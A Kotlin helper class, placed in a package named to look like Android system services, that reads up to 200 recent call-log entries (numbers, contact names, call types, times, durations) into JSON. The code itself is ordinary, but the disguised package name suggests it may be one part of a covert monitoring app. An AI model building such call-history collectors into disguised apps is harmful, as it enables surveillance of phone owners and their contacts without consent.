package com.android.systemservices

import android.content.Context
import android.provider.CallLog
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

class CallLogHelper(private val context: Context) {
    fun getCallLog(limit: Int = 200): JSONArray {
        val result = JSONArray()
        try {
            context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE,
                        CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME),
                null, null, "${CallLog.Calls.DATE} DESC"
            )?.use { cursor ->
                var count = 0
                while (cursor.moveToNext() && count++ < limit) {
                    result.put(JSONObject().apply {
                        put("number",   cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: "")
                        put("name",     cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "")
                        put("type",     when (cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE   -> "missed"
                            else                        -> "unknown"
                        })
                        put("date",     cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                        put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                    })
                }
            }
        } catch (e: Exception) {
            Log.e("CallLogHelper", "Error reading call log", e)
        }
        return result
    }
}
